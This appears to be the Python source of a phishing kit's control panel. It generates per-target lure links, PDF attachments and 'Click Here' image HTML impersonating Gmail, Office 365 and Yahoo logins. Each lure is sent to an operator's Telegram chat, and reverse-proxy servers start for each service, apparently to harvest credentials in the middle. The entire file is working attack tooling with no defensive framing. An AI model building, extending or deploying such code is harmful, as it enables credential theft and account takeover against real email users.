import logging
import ssl
import json
import uvicorn
from fastapi import FastAPI, Form, Request, File, UploadFile
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
import urllib.parse
import hashlib
from datetime import datetime
from telegram import Bot
import asyncio
from modpy import start_modpy
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import os
from PIL import Image
import io

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(message)s",
    datefmt="%Y/%m/%d %H:%M:%S"
)

app = FastAPI()
templates = Jinja2Templates(directory="templates")
app.mount("/static", StaticFiles(directory="static"), name="static")
app.mount("/uploads", StaticFiles(directory="uploads"), name="uploads")
app.mount("/pdfs", StaticFiles(directory="pdfs"), name="pdfs")

def load_config(service: str):
    try:
        with open(f"configs/{service}.json", "r") as f:
            return json.load(f)
    except Exception:
        logging.error(f"Config load failed for {service}")
        return None

def generate_pdf(service: str, email: str, link: str):
    config = load_config(service)
    if not config or "pdfTemplate" not in config:
        return None
    pdf_data = config["pdfTemplate"]
    filename = f"pdfs/{pdf_data['filename'].replace(' ', '_')}_{hashlib.md5(email.encode()).hexdigest()[:8]}.pdf"
    c = canvas.Canvas(filename, pagesize=letter)
    c.setFont("Helvetica-Bold", 16)
    c.drawString(100, 750, pdf_data["title"])
    c.setFont("Helvetica", 12)
    y = 700
    for line in pdf_data["body"].format(link=link).split("\n"):
        if "{link}" in line:
            c.setFillColorRGB(0, 0, 1)
            c.drawString(100, y, line.replace("{link}", ""))
            c.linkRect("", link, (100, y-5, 300, y+15))
            c.setFillColorRGB(0, 0, 0)
        else:
            c.drawString(100, y, line)
        y -= 20
    c.save()
    return filename

async def send_telegram_link(service: str, email: str, link: str, image_path: str = None, pdf_path: str = None):
    config = load_config(service)
    if not config:
        return
    bot_token = config.get("telegramBotToken")
    chat_id = config.get("telegramChatId")
    if not bot_token or not chat_id:
        return
    message = f"*Generated Lizard* 🦎\n*Service*: {config['serviceName']}\n*Email*: {email}\n*Link*: {link}"
    if image_path:
        image_url = f"https://{config['proxyDomain']}/uploads/{os.path.basename(image_path)}"
        message += f"\n*Image HTML*: ```html\n<a href=\"{link}\"><img src=\"{image_url}\" alt=\"Click Here\"></a>\n```"
    try:
        bot = Bot(token=bot_token)
        await bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")
        if pdf_path and os.path.exists(pdf_path):
            with open(pdf_path, "rb") as f:
                await bot.send_document(chat_id=chat_id, document=f, filename=os.path.basename(pdf_path))
        if image_path and os.path.exists(image_path):
            with open(image_path, "rb") as f:
                await bot.send_photo(chat_id=chat_id, photo=f)
        logging.info(f"Telegram link sent for {service}")
    except Exception as e:
        logging.error(f"Telegram error for {service}: {e}")

def generate_link(service: str, email: str):
    config = load_config(service)
    if not config:
        return None
    proxy_domain = config["proxyDomain"]
    email_encoded = urllib.parse.quote(email)
    return f"https://{proxy_domain}#{email_encoded}"

@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/generate", response_class=HTMLResponse)
async def generate(
    request: Request,
    email: str = Form(...),
    service: str = Form(...),
    image: UploadFile = File(None)
):
    if service not in ["gmail", "o365", "yahoo"]:
        return HTMLResponse("Invalid service", status_code=400)
    link = generate_link(service, email)
    if not link:
        return HTMLResponse("Failed to generate link", status_code=500)
    
    image_path = None
    if image:
        image_path = f"uploads/{hashlib.md5(email.encode()).hexdigest()[:8]}_{image.filename}"
        with open(image_path, "wb") as f:
            f.write(await image.read())
        try:
            img = Image.open(image_path)
            img.verify()
        except Exception:
            os.remove(image_path)
            return HTMLResponse("Invalid image", status_code=400)
    
    pdf_path = generate_pdf(service, email, link)
    
    await send_telegram_link(service, email, link, image_path, pdf_path)
    config = load_config(service)
    return templates.TemplateResponse("links.html", {
        "request": request,
        "service": config["serviceName"],
        "email": email,
        "link": link,
        "pdf_path": pdf_path,
        "image_path": image_path
    })

def main():
    ports = {"gmail": 8443, "o365": 8444, "yahoo": 8445}
    for service, port in ports.items():
        config = load_config(service)
        if config:
            logging.info(f"Starting proxy for {service} on {config['proxyDomain']}:{port}")
            asyncio.create_task(asyncio.to_thread(start_modpy, config, port))
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain("certs/server.crt", "certs/server.key")
    uvicorn.run(app, host="0.0.0.0", port=8000, ssl=ssl_context)

if __name__ == "__main__":
    main()